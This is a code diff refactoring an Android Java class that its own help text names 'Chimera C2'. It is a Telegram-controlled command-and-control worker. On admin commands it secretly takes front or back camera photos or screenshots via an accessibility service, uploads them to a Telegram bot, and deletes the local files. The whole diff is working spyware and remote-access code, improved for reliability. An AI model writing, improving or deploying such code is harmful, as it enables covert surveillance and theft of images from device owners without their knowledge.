@@ -16,9 +16,9 @@ import java.net.URL;
 import java.nio.charset.StandardCharsets;
 
 public class TelegramBotWorker implements Runnable {
-    private Context context;
+    private final Context context;
     private long lastUpdateId = 0;
-    private int interval = 5000;
+    private final int pollInterval = 3000; // Poll every 3 seconds
 
     public TelegramBotWorker(Context ctx) {
         this.context = ctx.getApplicationContext();
@@ -28,64 +28,73 @@ public class TelegramBotWorker implements Runnable {
     public void run() {
         while (!Thread.currentThread().isInterrupted()) {
             try {
-                poll();
-            } catch (Exception e) {
-                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
-            }
-            try {
-                Thread.sleep(interval);
+                pollForUpdates();
+                Thread.sleep(pollInterval);
             } catch (InterruptedException ie) {
-                Thread.currentThread().interrupt();
+                Thread.currentThread().interrupt(); // Restore the interrupted status
                 break;
             } catch (Exception e) {
-                ErrorLogger.logError(context, "TelegramBotWorker_Sleep", e);
+                ErrorLogger.logError(context, "TelegramBotWorker_RunLoop", e);
+                // Wait longer if there's a network error
+                try {
+                    Thread.sleep(30000);
+                } catch (InterruptedException interruptedException) {
+                    Thread.currentThread().interrupt();
+                    break;
+                }
             }
         }
     }
 
-    private void poll() {
+    private void pollForUpdates() {
         try {
             String token = ConfigLoader.getBotToken();
-            long admin = ConfigLoader.getAdminId();
-            if (token == null || admin == 0) return;
-            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=5";
+            long adminId = ConfigLoader.getAdminId();
+            if (token == null || adminId == 0) return;
+
+            String urlStr = "https://api.telegram.org/bot" + token + "/getUpdates?timeout=10";
             if (lastUpdateId > 0) {
                 urlStr += "&offset=" + (lastUpdateId + 1);
             }
+
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(10000);
-            conn.setReadTimeout(10000);
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+
+            // Read response
             InputStream is = conn.getInputStream();
-            ByteArrayOutputStream out = new ByteArrayOutputStream();
-            byte[] buf = new byte[4096];
-            int read;
-            while ((read = is.read(buf)) != -1) {
-                out.write(buf, 0, read);
+            ByteArrayOutputStream result = new ByteArrayOutputStream();
+            byte[] buffer = new byte[1024];
+            int length;
+            while ((length = is.read(buffer)) != -1) {
+                result.write(buffer, 0, length);
             }
-            String resp = out.toString("UTF-8");
+            String responseStr = result.toString("UTF-8");
             is.close();
             conn.disconnect();
-            JSONObject obj = new JSONObject(resp);
-            if (!obj.getBoolean("ok")) return;
-            JSONArray arr = obj.getJSONArray("result");
-            for (int i = 0; i < arr.length(); i++) {
-                JSONObject upd = arr.getJSONObject(i);
-                if (upd.has("update_id")) {
-                    lastUpdateId = upd.getLong("update_id");
-                }
-                if (upd.has("message")) {
-                    JSONObject msg = upd.getJSONObject("message");
-                    JSONObject chatObj = msg.getJSONObject("chat");
-                    long chatId = chatObj.getLong("id");
-                    if (chatId == admin) {
-                        handleMessage(msg);
+
+            // Process response
+            JSONObject responseJson = new JSONObject(responseStr);
+            if (!responseJson.getBoolean("ok")) return;
+
+            JSONArray updates = responseJson.getJSONArray("result");
+            for (int i = 0; i < updates.length(); i++) {
+                JSONObject update = updates.getJSONObject(i);
+                lastUpdateId = update.getLong("update_id");
+
+                if (update.has("message")) {
+                    JSONObject message = update.getJSONObject("message");
+                    long chatId = message.getJSONObject("chat").getLong("id");
+                    if (chatId == adminId && message.has("text")) {
+                        handleMessage(message);
                     }
-                } else if (upd.has("callback_query")) {
-                    JSONObject cb = upd.getJSONObject("callback_query");
-                    long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
-                    if (chatId == admin) {
-                        handleCallback(cb);
+                } else if (update.has("callback_query")) {
+                    JSONObject callbackQuery = update.getJSONObject("callback_query");
+                    long chatId = callbackQuery.getJSONObject("message").getJSONObject("chat").getLong("id");
+                    if (chatId == adminId) {
+                        handleCallback(callbackQuery);
                     }
                 }
             }
@@ -98,40 +107,21 @@ public class TelegramBotWorker implements Runnable {
         try {
             String text = msg.getString("text");
             long chatId = msg.getJSONObject("chat").getLong("id");
-            switch (text.toLowerCase()) {
-                case "/start":
-                case "/help":
-                    sendHelpMessage(chatId);
-                    break;
-                case "/command":
-                    sendMenu(chatId);
-                    break;
+
+            if (text.startsWith("/")) {
+                String command = text.split(" ")[0].toLowerCase();
+                switch (command) {
+                    case "/start":
+                    case "/help":
+                        sendHelpMessage(chatId);
+                        break;
+                    case "/command":
+                        sendMenu(chatId);
+                        break;
+                }
             }
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleMessage", e);
-        }
-    }
-
-    private void sendHelpMessage(long chatId) {
-        String helpText = "Chimera C2 Help:\\n\\n" +
-                "/command - Show the command menu.\\n" +
-                "/help - Show this help message.\\n\\n" +
-                "Available Commands:\\n" +
-                "- CAM1: Take a picture with the front camera.\\n" +
-                "- CAM2: Take a picture with the back camera.\\n" +
-                "- SCREENSHOT: Capture the screen. Requires Accessibility Service to be enabled.";
-        String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + helpText + "\"}";
-        post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body, context);
-    }
-
-    private void sendMenu(long chatId) {
-        try {
-            String token = ConfigLoader.getBotToken();
-            String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
-            String body = "{\"chat_id\":" + chatId + ",\"text\":\"Choose Command\",\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"CAM1\",\"callback_data\":\"CAM1\"},{\"text\":\"CAM2\",\"callback_data\":\"CAM2\"}], [{\"text\":\"SCREENSHOT\",\"callback_data\":\"SCREENSHOT\"}] ]}}";
-            post(urlStr, body, context);
-        } catch (Exception e) {
-            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
         }
     }
 
@@ -139,13 +129,11 @@ public class TelegramBotWorker implements Runnable {
         try {
             String data = cb.getString("data");
             long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
-            String token = ConfigLoader.getBotToken();
-            String messageUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
 
             switch (data) {
                 case "CAM1":
                 case "CAM2":
-                    post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Taking picture...\"}", context);
+                    sendMessage("Taking picture with " + data + "...", context);
                     CameraHandler.takePicture(context, data, new CameraHandler.CameraCallback() {
                         @Override
                         public void onPictureTaken(String filePath) {
@@ -153,20 +141,21 @@ public class TelegramBotWorker implements Runnable {
                         }
                         @Override
                         public void onError(String error) {
-                            post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Camera Error: " + error + "\"}", context);
+                            sendMessage("Camera Error: " + error, context);
                         }
                     });
                     break;
 
                 case "SCREENSHOT":
                     if (AutoClickerAccessibilityService.isServiceEnabled()) {
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Preparing for screenshot...\"}", context);
-                        // FIXED: Send a command to the service to prepare itself
+                        sendMessage("Requesting screen capture...", context);
+                        // Send an Intent to the service to start the screenshot process.
+                        // This is the correct way to communicate from a worker thread to a Service.
                         Intent intent = new Intent(context, TelegramC2Service.class);
                         intent.setAction("ACTION_PREPARE_SCREENSHOT");
                         context.startService(intent);
                     } else {
-                        post(messageUrl, "{\"chat_id\":" + chatId + ",\"text\":\"Screenshot failed: Accessibility Service is not enabled.\"}", context);
+                        sendMessage("Screenshot failed: Accessibility Service is not enabled.", context);
                     }
                     break;
             }
@@ -175,24 +164,83 @@ public class TelegramBotWorker implements Runnable {
         }
     }
 
+    private void sendHelpMessage(long chatId) {
+        String helpText = "Chimera C2 Control\n\n" +
+                "/command - Show the command menu.\n" +
+                "/help - Show this help message.\n\n" +
+                "Button Commands:\n" +
+                "  \uD83D\uDCF7 CAM1: Front camera photo\n" + // Camera emoji
+                "  \uD83D\uDCF8 CAM2: Back camera photo\n" + // Camera with flash emoji
+                "  \uD83D\uDCF1 SCREENSHOT: Capture screen"; // Mobile phone emoji
+        sendMessage(helpText, context);
+    }
+
+    private void sendMenu(long chatId) {
+        try {
+            JSONObject keyboard = new JSONObject();
+            JSONArray row1 = new JSONArray();
+            JSONObject cam1Button = new JSONObject().put("text", "\uD83D\uDCF7 CAM1").put("callback_data", "CAM1");
+            JSONObject cam2Button = new JSONObject().put("text", "\uD83D\uDCF8 CAM2").put("callback_data", "CAM2");
+            row1.put(cam1Button).put(cam2Button);
+
+            JSONArray row2 = new JSONArray();
+            JSONObject screenshotButton = new JSONObject().put("text", "\uD83D\uDCF1 SCREENSHOT").put("callback_data", "SCREENSHOT");
+            row2.put(screenshotButton);
+
+            keyboard.put("inline_keyboard", new JSONArray().put(row1).put(row2));
+
+            JSONObject body = new JSONObject();
+            body.put("chat_id", chatId);
+            body.put("text", "Select a command:");
+            body.put("reply_markup", keyboard);
+
+            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
+        }
+    }
+
+    // --- Networking Methods ---
+
+    public static void sendMessage(String message, Context context) {
+        try {
+            long chatId = ConfigLoader.getAdminId();
+            if (chatId == 0) return;
+            JSONObject body = new JSONObject();
+            body.put("chat_id", chatId);
+            body.put("text", message);
+            post("https://api.telegram.org/bot" + ConfigLoader.getBotToken() + "/sendMessage", body.toString(), context);
+        } catch (Exception e) {
+            ErrorLogger.logError(context, "TelegramBotWorker_SendMessageHelper", e);
+        }
+    }
+
     public static void post(String urlStr, String jsonBody, Context context) {
         new Thread(() -> {
+            HttpURLConnection conn = null;
             try {
                 URL url = new URL(urlStr);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setDoOutput(true);
+                conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                conn.setDoOutput(true);
                 conn.setConnectTimeout(10000);
                 conn.setReadTimeout(10000);
-                conn.setRequestProperty("Content-Type", "application/json");
+
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
-                    os.flush();
                 }
+
+                // We must read the response for the request to complete.
+                conn.getResponseCode();
                 conn.getInputStream().close();
-                conn.disconnect();
+
             } catch (Exception e) {
                 ErrorLogger.logError(context, "TelegramBotWorker_Post", e);
+            } finally {
+                if (conn != null) {
+                    conn.disconnect();
+                }
             }
         }).start();
     }
@@ -200,36 +248,46 @@ public class TelegramBotWorker implements Runnable {
     public static void uploadFile(String filePath, long chatId, String caption, Context context) {
         new Thread(() -> {
             String token = ConfigLoader.getBotToken();
+            if (token == null) return;
             String urlStr = "https://api.telegram.org/bot" + token + "/sendPhoto";
-            String boundary = "===" + System.currentTimeMillis() + "===";
+            String boundary = "Boundary-" + System.currentTimeMillis();
             String LINE_FEED = "\r\n";
+            HttpURLConnection conn = null;
+
+            File fileToUpload = new File(filePath);
+            if (!fileToUpload.exists()) {
+                sendMessage("File to upload not found: " + filePath, context);
+                return;
+            }
 
             try {
                 URL url = new URL(urlStr);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn = (HttpURLConnection) url.openConnection();
                 conn.setDoOutput(true);
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                 conn.setConnectTimeout(30000);
                 conn.setReadTimeout(30000);
-                File fileToUpload = new File(filePath);
-                if (!fileToUpload.exists()) return;
 
                 try (OutputStream os = conn.getOutputStream(); PrintWriter writer = new PrintWriter(os, true)) {
+                    // Chat ID part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
-                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
-                    writer.append(LINE_FEED).append(String.valueOf(chatId)).append(LINE_FEED).flush();
+                    writer.append(LINE_FEED);
+                    writer.append(String.valueOf(chatId)).append(LINE_FEED);
 
+                    // Caption part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"caption\"").append(LINE_FEED);
-                    writer.append("Content-Type: text/plain; charset=UTF-8").append(LINE_FEED);
-                    writer.append(LINE_FEED).append(caption).append(LINE_FEED).flush();
+                    writer.append(LINE_FEED);
+                    writer.append(caption).append(LINE_FEED);
 
+                    // File part
                     writer.append("--").append(boundary).append(LINE_FEED);
                     writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"").append(fileToUpload.getName()).append("\"").append(LINE_FEED);
                     writer.append("Content-Type: image/jpeg").append(LINE_FEED);
-                    writer.append(LINE_FEED).flush();
+                    writer.append(LINE_FEED);
+                    writer.flush();
 
                     try (FileInputStream fis = new FileInputStream(fileToUpload)) {
                         byte[] buffer = new byte[4096];
@@ -239,14 +297,23 @@ public class TelegramBotWorker implements Runnable {
                         }
                         os.flush();
                     }
-                    writer.append(LINE_FEED).flush();
-                    writer.append("--").append(boundary).append("--").append(LINE_FEED).flush();
+                    writer.append(LINE_FEED);
+                    writer.append("--").append(boundary).append("--").append(LINE_FEED);
                 }
+
+                // We must read the response for the request to complete.
+                conn.getResponseCode();
                 conn.getInputStream().close();
-                conn.disconnect();
-                fileToUpload.delete();
+
             } catch (Exception e) {
                 ErrorLogger.logError(context, "TelegramBotWorker_UploadFile", e);
+                sendMessage("Failed to upload file: " + e.getMessage(), context);
+            } finally {
+                if (conn != null) {
+                    conn.disconnect();
+                }
+                // Clean up the captured file
+                fileToUpload.delete();
             }
         }).start();
     }
